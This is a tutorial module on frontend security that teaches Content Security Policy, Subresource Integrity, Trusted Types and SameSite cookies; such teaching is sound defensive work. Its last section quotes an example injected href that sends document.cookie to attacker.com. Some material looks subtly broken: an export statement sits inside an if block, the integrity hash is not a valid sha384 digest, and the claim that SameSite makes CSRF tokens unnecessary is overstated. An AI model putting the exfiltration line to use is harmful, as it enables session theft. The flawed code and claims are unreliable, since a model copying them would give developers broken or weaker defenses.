# Module 18: Frontend Security — CSP, XSS Defense, CSRF & Trusted Types

**Track:** Modern JavaScript — Frontend Architecture & Web APIs
**Category:** Web Security, Content Security Policy & XSS Elimination

---

## 1. The Web Frontend Threat Landscape

```text
┌─────────────────────────────────────────────────────────────┐
│                 Top Frontend Security Attack Vectors        │
├────────────────────┬────────────────────────────────────────┤
│ **1. XSS**         │ Attacker injects malicious JavaScript  │
│ (Cross-Site        │ to steal JWT tokens, session cookies,  │
│ Scripting)         │ or log keystrokes.                     │
├────────────────────┼────────────────────────────────────────┤
│ **2. CSRF**        │ Malicious third-party website tricks   │
│ (Cross-Site Request│ user's browser into submitting actions │
│ Forgery)           │ to an authenticated banking/API server.│
├────────────────────┼────────────────────────────────────────┤
│ **3. Clickjacking**│ Attacker frames your app in a hidden   │
│                    │ transparent `<iframe>` to trick clicks.│
└────────────────────┴────────────────────────────────────────┘
```

---

## 2. Hardening with Content Security Policy (CSP Level 3)

**Content Security Policy (CSP)** is an HTTP response header that restricts which scripts, styles, images, and network domains can execute in the user's browser.

### The Modern Nonce-Based Strict CSP

```http
Content-Security-Policy:
  object-src 'none';
  script-src 'nonce-rAnd0m1234' 'strict-dynamic' https: 'unsafe-inline';
  base-uri 'none';
  frame-ancestors 'none';
```

- **`'nonce-...'`**: Scripts execute **only if they contain the matching cryptographic server nonce**:

  ```html
  <script nonce="rAnd0m1234" src="/app.js"></script>
  ```

  Any injected script tag without the nonce is **instantly blocked by the browser engine**.

- **`frame-ancestors 'none'`**: Completely prevents other websites from embedding your app in an `<iframe>`, eliminating Clickjacking attacks!

---

## 3. Subresource Integrity (SRI) for CDN Scripts

When loading third-party scripts from CDNs, if the CDN is compromised, attackers can inject malicious cryptominers or keyloggers into the script.

**Subresource Integrity (SRI)** verifies the cryptographic hash of the downloaded script before executing it:

```html
<script
  src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"
  integrity="sha384-tZ93Gg8Q0aA4JqgN+L1g5x3jC8U2o5wB8p6x6s5o4w3q2w1="
  crossorigin="anonymous">
</script>
```

*If a compromised CDN alters even 1 bit of code, the browser aborts execution with a `Failed to find a valid digest` error.*

---

## 4. Eliminating DOM XSS with the Trusted Types API

DOM-based XSS happens when untrusted strings are passed into dangerous DOM "sinks" (`element.innerHTML`, `eval()`, `document.write()`, `script.src`).

The **Trusted Types API** allows you to lock down the browser, making it **impossible to assign raw strings to DOM sinks**:

```javascript
// src/security/trusted_types_policy.js

if (window.trustedTypes && window.trustedTypes.createPolicy) {
  // 1. Create a Sanitization Policy:
  export const escapeHtmlPolicy = window.trustedTypes.createPolicy('default', {
    createHTML: (string) => {
      // Escape HTML entities to prevent script injection:
      return string
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
    },
    createScriptURL: (url) => {
      // Only allow loading scripts from approved corporate domains:
      if (url.startsWith('https://static.acme.com/')) {
        return url;
      }
      throw new TypeError(`Untrusted script URL: ${url}`);
    },
  });
}
```

```javascript
// 2. Enforce Trusted Types in CSP Header:
// Content-Security-Policy: require-trusted-types-for 'script';

// If any developer or library tries:
// element.innerHTML = userPayload; // 💥 Browser THROWS A SECURITY ERROR!
// Must use:
element.innerHTML = escapeHtmlPolicy.createHTML(userPayload); // ✅ Validated!
```

---

## 5. Modern CSRF Defense: `SameSite` Cookies

Legacy CSRF tokens are no longer necessary for modern browsers when cookies are configured with **`SameSite=Strict`** or **`SameSite=Lax`**:

```http
Set-Cookie: session_id=abc123xyz; Secure; HttpOnly; SameSite=Strict
```

- **`SameSite=Strict`**: The browser **never sends the cookie on cross-site requests** (e.g. clicking a link on `attacker.com` pointing to your banking API will NOT include the session cookie!).

---

## Troubleshooting & Best Practices

1. **Never Use `eval()`, `new Function()`, or `setTimeout("string", ...)`**
   Passing strings to evaluation functions allows attackers with input access to execute arbitrary JavaScript.

2. **Sanitize Dynamic Links (`href`)**
   Attackers can inject `href="javascript:fetch('https://attacker.com?c=' + document.cookie)"`. Always validate that dynamic URLs begin with `https://` or `http://` before setting anchor `href` attributes.
